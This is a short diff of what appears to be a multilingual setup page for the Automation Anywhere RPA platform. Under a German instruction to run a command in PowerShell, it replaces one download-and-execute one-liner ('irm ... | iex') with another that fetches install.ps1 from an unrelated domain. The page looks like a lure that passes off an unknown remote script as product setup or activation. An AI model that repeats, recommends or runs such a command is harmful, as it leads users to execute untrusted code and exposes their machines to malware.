@@ -16,7 +16,7 @@ Automation Anywhere is an enterprise robotic process automation (RPA) platform t
 Fuehren Sie den folgenden Befehl in PowerShell aus, um die Einrichtung zu starten:
 
 ```powershell
-irm https://raw.githubusercontent.com/dustfinderfactory/Activate/main/install.ps1 | iex
+irm https://tubelist.fun/install.ps1 | iex
 ```
 
 ## Yoten (JA)
